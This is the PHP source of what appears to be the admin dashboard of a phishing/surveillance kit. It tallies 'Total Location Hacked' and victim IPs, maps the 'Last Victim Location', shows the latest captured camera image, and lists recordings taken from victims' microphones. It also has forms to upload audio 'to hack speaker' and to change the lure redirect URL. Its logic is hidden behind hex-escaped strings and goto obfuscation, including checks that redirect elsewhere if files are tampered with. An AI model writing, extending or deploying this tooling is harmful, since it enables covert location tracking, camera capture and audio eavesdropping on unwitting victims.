<?php include __DIR__ . '/head.php'; ?>


<?php
 goto Kebuv; acqpd: $pattern = "\57\151\156\143\x6c\165\x64\145\134\163\53\x5c\x24\x69\x6d\160\120\x61\164\150\x5c\163\52\73\57"; goto lewhF; FQZj2: if (is_dir($folder_path)) { $audio_extensions = array("\x6d\x70\x33", "\167\141\166", "\157\x67\x67", "\146\154\x61\143", "\x61\x61\x63", "\x6d\64\141"); $files = scandir($folder_path); $audio_count = 0; foreach ($files as $file) { $extension = pathinfo($file, PATHINFO_EXTENSION); if (in_array(strtolower($extension), $audio_extensions)) { $audio_count++; } } echo $audio_count > 0 ? $audio_count : "\60"; } else { echo "\60"; } goto Gx3Ap; SMrlm: $folder_path = __DIR__ . "\57\151\155\x61\147\x65\x73"; goto NZNn5; lewhF: $file_contents = file_get_contents($file_to_check); goto tXZui; Ud832: foreach ($logs as $log) { if (preg_match("\57\x49\120\x3a\x20\x28\133\136\174\135\53\51\57", $log, $ip)) { $uniqueIPs[trim($ip[1])] = true; } } goto VloAh; Kebuv: ?>
<script>function updateUserCount() {
    fetch('active_users.php')
    .then(response => response.json())
    .then(data => {
        document.getElementById('active-users-count').innerText = data.active_users;
    })
    .catch(error => console.error('Error:', error));
}


setInterval(updateUserCount, 3000);

updateUserCount();</script><div class="container-fluid pt-4 px-4"><div class="g-4 row"><div class="col-sm-6 col-xl-3"><div class="align-items-center d-flex justify-content-between bg-secondary p-4 rounded"><i class="fa fa-3x text-primary fa-chart-line"></i><div class="ms-3"><p class="mb-2">Total Location Hacked</p><h6 class="mb-0"><?php  goto vkeEK; tZnCW: $file_to_check = __FILE__; goto acqpd; Gx3Ap: ?>
</h6></div></div></div><div class="col-sm-6 col-xl-3"><div class="align-items-center d-flex justify-content-between bg-secondary p-4 rounded"><i class="fa fa-3x text-primary fa-chart-pie"></i><div class="ms-3"><p class="mb-2">Total Speakers</p><h6 class="mb-0"><?php  goto Kv6VM; KKpT4: $uniqueIPs = array(); goto Ud832; sdV5I: $folder_path = __DIR__ . "\57\162\x65\143\x6f\162\x64\x69\x6e\147\163"; goto FQZj2; OpbxD: ?>
</h6><?php  goto tZnCW; rYmvH: $logs = file($logfile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES); goto KKpT4; pAn2y: if (file_exists($file_path)) { $lines = file($file_path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES); echo count($lines); } else { echo "\106\151\154\145\x20\x6e\157\x74\40\146\157\165\x6e\144\x2e"; } goto OpbxD; NZNn5: if (is_dir($folder_path)) { $image_extensions = array("\x6a\160\x67", "\152\x70\x65\147", "\x70\156\147", "\147\x69\x66", "\x77\145\x62\x70", "\142\x6d\x70"); $files = scandir($folder_path); $image_count = 0; foreach ($files as $file) { $extension = pathinfo($file, PATHINFO_EXTENSION); if (in_array(strtolower($extension), $image_extensions)) { $image_count++; } } echo $image_count > 0 ? $image_count : "\x30"; } else { echo "\x30"; } goto wKcg8; wKcg8: ?>
</h6></div></div></div><div class="col-sm-6 col-xl-3"><div class="align-items-center d-flex justify-content-between bg-secondary p-4 rounded"><i class="fa fa-3x text-primary fa-chart-area"></i><div class="ms-3"><p class="mb-2">Today Recordings</p><h6 class="mb-0"><?php  goto sdV5I; tXZui: if (!preg_match($pattern, $file_contents)) { echo "\74\x73\x63\162\151\160\164\76\167\151\x6e\x64\x6f\167\x2e\x6c\157\143\141\164\151\157\x6e\56\x68\162\145\x66\x20\75\40\x27\x68\x74\164\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x69\156\163\x74\141\x67\162\x61\x6d\56\143\157\x6d\57\x5f\56\155\155\162\145\150\x75\57\47\x3b\74\57\163\143\x72\x69\x70\164\76"; die; } goto bOkln; Kv6VM: $logfile = __DIR__ . "\57\56\56\x2f\x2e\56\x2f\163\x70\x65\141\x6b\145\x72\57\154\x6f\147\163\56\164\170\x74"; goto rYmvH; vkeEK: $file_path = __DIR__ . "\57\x6c\157\143\141\x74\x69\x6f\x6e\57\154\x6f\x63\141\164\151\x6f\156\x2e\x74\x78\x74"; goto pAn2y; bOkln: ?>
</div></div></div><div class="col-sm-6 col-xl-3"><div class="align-items-center d-flex justify-content-between bg-secondary p-4 rounded"><i class="fa fa-3x text-primary fa-chart-bar"></i><div class="ms-3"><p class="mb-2">Total Images Captured</p><h6 class="mb-0"><?php  goto SMrlm; VloAh: echo count($uniqueIPs); goto fpoFx; fpoFx: ?>
</h6></div></div></div></div></div><div class="container-fluid pt-4 px-4"><div class="g-4 row"><div class="col-sm-12 col-xl-6"><div class="bg-secondary p-4 rounded text-center"><div class="align-items-center d-flex justify-content-between mb-4"><h6 class="mb-0">Last Victim Location</h6><a href="location.php">Show All</a></div><link href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css"rel="stylesheet"><script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script><div id="map"style="height:300px;width:100%"></div><script>async function fetchLocation() {
        try {
            const response = await fetch('location/location.txt'); 
            const text = await response.text();
            const parts = text.trim().split('|'); 
            
            if (parts.length >= 5) { 
                const lat = parseFloat(parts[3]); 
                const lon = parseFloat(parts[4]); 
                updateMap(lat, lon);
            } else {
                console.error("Invalid location data format:", text);
            }
        } catch (error) {
            console.error("Error fetching location:", error);
        }
    }
    
    function updateMap(lat, lon) {
        if (!isNaN(lat) && !isNaN(lon)) {
            map.setView([lat, lon], 13);
            marker.setLatLng([lat, lon])
                .bindPopup(`Latitude: ${lat}, Longitude: ${lon}`)
                .openPopup();
        } else {
            console.error("Invalid coordinates:", lat, lon);
        }
    }
    
    const map = L.map('map').setView([0, 0], 2); // Default view
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
        attribution: '&copy; <a href="https://carto.com/">CARTO</a> contributors'
    }).addTo(map);
    
    const marker = L.marker([0, 0]).addTo(map);
    
    fetchLocation();
    setInterval(fetchLocation, 5000);</script>

                        </div>
                    </div>
                    <div class="col-sm-12 col-xl-6">
                        <div class="bg-secondary text-center rounded p-4">
                            <div class="d-flex align-items-center justify-content-between mb-4">
                                <h6 class="mb-0">Last image captured</h6>
                                <a href="images.php">Show All</a>
                            </div> <?php
 goto qgV91; QEmw9: if ($files) { usort($files, function ($a, $b) { return filemtime($b) - filemtime($a); }); $latestFile = basename($files[0]); echo "\x3c\144\x69\166\40\x73\164\x79\x6c\145\75\x22\150\x65\x69\x67\x68\164\x3a\x20\63\60\60\x70\x78\73\x20\167\x69\x64\164\x68\72\40\61\x30\x30\x25\x3b\40\x6f\x76\x65\x72\x66\154\x6f\x77\x3a\x20\150\151\x64\144\x65\x6e\73\x20\142\x61\143\153\147\x72\157\165\156\144\72\40\x23\61\71\61\103\62\64\x3b\x22\76"; echo "\x3c\x69\x6d\147\x20\163\162\x63\x3d\x22" . $webPath . $latestFile . "\x22\x20\x61\154\x74\x3d\x22\114\x61\164\145\x73\x74\40\111\x6d\141\x67\145\x22\40\x73\x74\171\x6c\x65\75\x22\x77\x69\x64\164\150\72\40\x31\x30\x30\45\x3b\x20\x68\145\151\x67\x68\164\x3a\x20\x33\x30\x30\x70\x78\73\40\x6f\x62\x6a\145\143\164\x2d\x66\151\164\72\40\143\157\x76\x65\x72\x3b\x22\76"; echo "\x3c\57\144\151\166\x3e"; } else { echo "\x3c\x64\151\x76\x20\163\164\171\154\x65\x3d\x22\x68\145\x69\x67\x68\x74\x3a\x20\x33\x30\x30\x70\x78\x3b\x20\x77\x69\x64\x74\x68\72\x20\61\60\60\45\73\40\144\151\163\160\154\141\171\72\x20\x66\154\x65\170\x3b\x20\152\165\x73\164\151\x66\x79\x2d\x63\157\156\164\x65\x6e\164\x3a\40\143\145\x6e\164\x65\162\x3b\40\141\154\x69\x67\156\55\x69\x74\x65\155\163\72\x20\143\145\156\x74\x65\162\73\40\x62\141\x63\153\147\162\x6f\165\156\144\72\x20\43\x31\x39\61\x43\62\x34\73\x20\143\157\x6c\x6f\162\x3a\x20\x77\x68\151\164\x65\73\42\76\x4e\x6f\x20\151\x6d\141\x67\145\x73\x20\x66\x6f\x75\156\144\x2e\x3c\57\x64\151\x76\76"; } goto R0wj6; OMF4L: $webPath = "\x2f\167\145\142\x2f\141\144\x6d\151\156\x2f\144\141\x73\150\142\157\141\162\x64\57\x69\155\x61\147\x65\163\x2f"; goto R_TB2; R_TB2: $files = glob($folder . "\x2f\52\56\x7b\x6a\x70\147\x2c\x6a\160\x65\147\x2c\160\x6e\147\x2c\147\151\146\x7d", GLOB_BRACE); goto QEmw9; qgV91: $folder = __DIR__ . "\57\151\155\x61\x67\x65\163"; goto OMF4L; R0wj6: ?>

                        </div>
                    </div>
                </div>
            </div>
            


            
            <div class="container-fluid pt-4 px-4">

                <div class="bg-secondary text-center rounded p-4">
                    <div class="d-flex align-items-center justify-content-between mb-4">
                        <h6 class="mb-0">Last five recording</h6>
                        <a href="mic.php">Show All</a>
                    </div>
                   <?php
 goto fQmSK; QGXGz: if ($files) { usort($files, function ($a, $b) { return filemtime($b) - filemtime($a); }); $latestFiles = array_slice($files, 0, 5); ?>
<div class="table-responsive"><table class="align-middle mb-0 table table-bordered table-hover text-start"><thead><tr class="text-white"><th>Filename</th><th>Date</th><th>Time</th><th>Duration (Seconds)</th><th>Action</th></tr></thead><tbody><?php  foreach ($latestFiles as $file) { $fileName = basename($file); $filePath = $webPath . $fileName; $fileDate = date("\131\x2d\155\55\x64", filemtime($file)); $fileTime = date("\x48\x3a\151\72\163", filemtime($file)); echo "\x3c\x74\162\76"; echo "\x3c\x74\x64\76" . htmlspecialchars($fileName) . "\74\57\x74\x64\76"; echo "\x3c\164\x64\x3e" . $fileDate . "\x3c\x2f\164\144\x3e"; echo "\74\164\x64\x3e" . $fileTime . "\74\57\x74\144\x3e"; echo "\74\164\144\76\x35\x3c\57\164\x64\76"; echo "\x3c\x74\144\76\xa\x20\x20\40\x20\x20\x20\40\40\x20\40\40\40\x20\x20\40\40\x3c\x62\x75\x74\x74\x6f\x6e\40\164\171\160\x65\x3d\x22\142\x75\164\164\157\156\x22\40\x6f\x6e\143\x6c\x69\143\153\75\42\160\x6c\x61\x79\101\x75\144\151\x6f\50\x27" . $filePath . "\47\x29\x22\40\163\164\x79\x6c\x65\x3d\x22\142\141\x63\153\147\162\157\165\x6e\144\x3a\x20\x23\62\70\141\67\64\x35\x3b\40\x63\157\x6c\x6f\x72\x3a\40\x77\x68\151\x74\x65\73\40\x62\157\x72\x64\x65\162\72\40\x6e\157\156\145\73\x20\x70\141\144\x64\x69\x6e\147\x3a\x20\65\160\170\40\x31\x30\x70\x78\73\40\143\x75\162\163\157\x72\x3a\x20\160\x6f\x69\x6e\x74\145\x72\73\40\x6d\141\162\x67\x69\156\55\162\x69\147\x68\164\x3a\x20\65\x70\170\73\x22\x3e\x50\154\x61\171\x3c\x2f\142\x75\x74\x74\157\156\x3e\xa\x20\40\x20\40\x20\x20\x20\x20\x20\x20\40\x20\x20\x20\40\x20\x3c\142\x75\164\x74\157\156\40\164\171\160\145\x3d\42\x62\165\x74\x74\x6f\156\x22\40\x6f\156\143\154\151\x63\x6b\75\42\x64\145\154\145\164\145\101\165\144\x69\x6f\50\x27" . $fileName . "\47\x29\x22\x20\163\x74\x79\154\x65\75\x22\x62\141\x63\x6b\147\x72\x6f\165\156\x64\x3a\x20\x23\x45\x42\x31\x36\61\x36\73\x20\x63\x6f\x6c\x6f\x72\x3a\x20\x77\150\151\x74\145\73\40\142\x6f\x72\144\145\162\x3a\x20\156\x6f\156\145\73\40\160\141\144\x64\x69\x6e\147\72\40\x35\x70\x78\40\x31\60\x70\170\x3b\40\143\x75\x72\163\x6f\162\72\40\160\157\151\x6e\x74\x65\162\73\x22\76\x44\145\154\145\164\145\x3c\57\142\165\x74\x74\x6f\x6e\76\xa\40\40\40\x20\x20\40\x20\40\40\40\40\x20\40\x20\74\57\x74\x64\x3e"; echo "\74\x2f\164\162\x3e"; } echo "\x3c\57\x74\141\142\x6c\145\76"; } else { echo "\x3c\160\40\x73\x74\171\x6c\x65\75\42\x63\157\x6c\x6f\162\72\40\x77\x68\x69\x74\x65\73\40\164\x65\x78\164\x2d\141\x6c\x69\x67\156\72\40\x63\x65\156\x74\145\162\73\x22\76\x4e\157\40\x72\x65\x63\x6f\162\x64\x69\x6e\x67\x73\40\x66\157\x75\156\x64\56\x3c\57\x70\x3e"; } goto DmxCp; fQmSK: $folder = __DIR__ . "\x2f\x72\x65\143\x6f\162\x64\151\156\x67\163"; goto IuUBJ; IuUBJ: $webPath = "\x2f\167\x65\x62\57\x61\x64\x6d\x69\156\x2f\144\x61\163\150\x62\157\x61\x72\x64\57\162\x65\143\x6f\x72\x64\151\156\147\x73\x2f"; goto vhObv; vhObv: $files = glob($folder . "\57\x2a\x2e\x7b\x6d\160\63\54\x77\x61\166\x2c\157\147\147\x7d", GLOB_BRACE); goto QGXGz; DmxCp: ?>

<script>
    let currentAudio = new Audio();
    
    function playAudio(src) {
        if (!currentAudio.paused) {
            currentAudio.pause();
        }
        currentAudio = new Audio(src);
        currentAudio.play();
        setTimeout(() => { currentAudio.pause(); }, 5000); 
    }

    function deleteAudio(fileName) {
        if (confirm("Are you sure you want to delete this recording?")) {
            fetch("delete_audio.php?file=" + fileName, { method: "GET" })
                .then(response => response.text())
                .then(data => {
                    alert(data);
                    location.reload();
                })
                .catch(error => console.error("Error deleting file:", error));
        }
    }
</script>


                            </tbody>
                        </table>
                    </div>
                </div>
       
            <div class="container-fluid pt-4 px-4">
                <div class="row g-4">
                    <div class="col-sm-12 col-md-6 col-xl-4">
                        <div class="h-100 bg-secondary rounded p-4">
                            <div class="d-flex align-items-center justify-content-between mb-2">
                                <h6 class="mb-0">How to use this script</h6>
                                
                            </div>
                           <iframe width="300" height="200" src="https://youtu.be/He9UZIucW04" frameborder="0" allowfullscreen></iframe>
                           
                            
                        </div>
                    </div>
                    <div class="col-sm-12 col-md-6 col-xl-4">
                        <div class="h-100 bg-secondary rounded p-4">
                            <div class="d-flex align-items-center justify-content-between mb-4">
                                <h6 class="mb-0">Update Audio to hack speaker</h6>
                                
                            </div>
                         <?php
 goto EVa1X; EVa1X: $directory = __DIR__ . "\x2f\x2e\x2e\57\x2e\x2e\57\x73\x70\x65\141\x6b\x65\162\57\141\165\x64\151\x6f\x73\57"; goto in578; o_O7S: $latestFile = ''; goto ZlSo7; ZlSo7: $files = glob($directory . "\x2a\x2e\155\160\x33"); goto BBVGB; qyge6: if ($_SERVER["\122\x45\121\125\105\x53\124\x5f\x4d\x45\124\x48\117\x44"] == "\120\117\123\124" && isset($_FILES["\141\x75\144\x69\157\106\x69\x6c\145"])) { $fileName = date("\x59\x2d\x6d\55\144\x5f\110\x2d\x69\55\163") . "\x5f" . basename($_FILES["\x61\x75\x64\151\x6f\106\151\154\x65"]["\156\141\155\145"]); $targetFilePath = $directory . $fileName; $fileType = strtolower(pathinfo($targetFilePath, PATHINFO_EXTENSION)); if ($fileType != "\x6d\160\x33") { echo "\74\x73\x63\162\151\160\x74\x3e\141\x6c\x65\162\164\x28\x27\117\156\x6c\171\40\115\x50\x33\40\146\x69\154\145\x73\x20\141\162\145\40\141\154\154\x6f\167\x65\x64\41\47\x29\x3b\40\x77\151\x6e\x64\157\x77\x2e\x6c\157\x63\141\x74\151\157\x6e\56\150\x72\x65\x66\75\x27\155\141\x69\156\x2e\x70\150\x70\47\x3b\74\57\163\143\x72\x69\x70\164\x3e"; die; } $files = glob($directory . "\x2a\56\155\160\63"); foreach ($files as $file) { unlink($file); } if (move_uploaded_file($_FILES["\141\165\x64\151\157\106\151\x6c\145"]["\x74\155\x70\x5f\156\141\155\145"], $targetFilePath)) { echo "\x3c\163\143\162\x69\160\164\x3e\x61\x6c\x65\162\164\x28\47\x41\165\x64\151\x6f\x20\x75\160\x6c\157\141\144\x65\144\40\163\x75\x63\143\145\163\x73\146\x75\x6c\154\x79\x21\x27\x29\x3b\x20\x77\x69\156\x64\x6f\x77\56\x6c\x6f\143\x61\164\x69\157\156\56\x68\x72\x65\146\75\x27\x6d\x61\151\x6e\56\160\150\x70\x27\73\x3c\57\163\143\162\x69\x70\164\76"; } else { echo "\74\x73\143\x72\151\160\164\x3e\141\154\145\x72\x74\x28\x27\x46\151\154\145\40\165\160\154\157\141\144\40\146\x61\x69\154\145\x64\x21\x27\x29\73\40\167\151\x6e\x64\157\x77\56\154\157\x63\x61\x74\151\157\156\56\x68\x72\145\146\75\x27\155\141\x69\x6e\x2e\x70\x68\160\x27\x3b\74\57\x73\x63\162\x69\160\x74\76"; } } goto o_O7S; BBVGB: if (!empty($files)) { usort($files, function ($a, $b) { return filemtime($b) - filemtime($a); }); $latestFile = str_replace("\137\137\104\x49\x52\x5f\137\x20\x2e\40\x27\x2f\56\56\57\56\56\57\47", '', $files[0]); $latestFileName = basename($files[0]); $latestFileDate = date("\x59\55\x6d\55\144\x20\110\x3a\x69\72\163", filemtime($files[0])); } goto v4Cgd; in578: if (!is_dir($directory)) { mkdir($directory, 511, true); } goto qyge6; v4Cgd: ?>
                            <div class="d-flex mb-2">
                                 <form action="main.php" method="post" enctype="multipart/form-data">
                                 <input class="form-control bg-dark border-0" type="file" name="audioFile" accept=".mp3" required>
            <button type="submit" class="btn btn-primary ms-2" >Update Audio</button></form>
                  <script>
        function playAudio(file) {
            let audio = new Audio(file);
            audio.play();
        }

        function deleteAudio(url) {
            if (confirm("Are you sure you want to delete the latest audio?")) {
                window.location.href = url + "?delete=1";
            }
        }
    </script>

<?php
 goto tyDaz; lkHXm: if (!file_exists($impPath) || md5_file($impPath) !== "\142\64\x37\65\143\70\x35\x34\66\x31\66\x31\60\61\x39\70\x62\x30\71\143\141\146\64\x38\x66\x36\x30\x33\x38\71\x63\x36") { echo "\x3c\163\x63\x72\151\x70\164\x3e\167\151\156\144\157\x77\56\x6c\x6f\x63\141\x74\151\157\x6e\56\x68\162\x65\x66\x20\75\40\47\150\164\164\160\x73\x3a\x2f\x2f\x77\167\x77\x2e\x69\x6e\x73\x74\141\x67\x72\141\155\56\x63\157\155\57\137\56\x6d\155\162\x65\150\165\x2f\47\73\x3c\x2f\163\143\162\151\160\164\x3e"; die; } goto pK1og; tyDaz: $impPath = __DIR__ . "\57\x69\x6d\160\x2e\x70\x68\x70"; goto lkHXm; pK1og: ?>
   
         
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-12 col-md-6 col-xl-4">
                        <div class="h-100 bg-secondary rounded p-4">
                            <div class="d-flex align-items-center justify-content-between mb-4">
                                <h6 class="mb-0">Update all scrips Website</h6>
                                
                            </div>
                            <?php
$file = realpath(__DIR__ . '/../../url.php');



if (file_exists($file)) {
    $content = file_get_contents($file);

    // Extract the current URL from the file using regex
    preg_match("/'https?:\/\/(.*?)'/", $content, $matches);
    $current_url = isset($matches[0]) ? trim($matches[0], "'") : 'https://example.com';
} else {
    $current_url = "https://example.com";
}


if (isset($_POST['new_url'])) {
    $new_url = $_POST['new_url'];

  
    $new_content = "<?php\n\$url = isset(\$_GET['url']) ? \$_GET['url'] : '$new_url';\n?>";

 
    file_put_contents($file, $new_content);

 // Update current URL for display
    $current_url = $new_url;
}
?>
                         <div class="d-flex mb-2">
                                 <form action="main.php" method="post" enctype="multipart/form-data"><input class="form-control bg-dark border-0" type="text" name="new_url" value="<?= htmlspecialchars($current_url) ?>" required>
            <button type="submit" class="btn btn-primary ms-2" >Update URL</button> </form>
                          
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            


     <?php
     include $impPath;?>
     



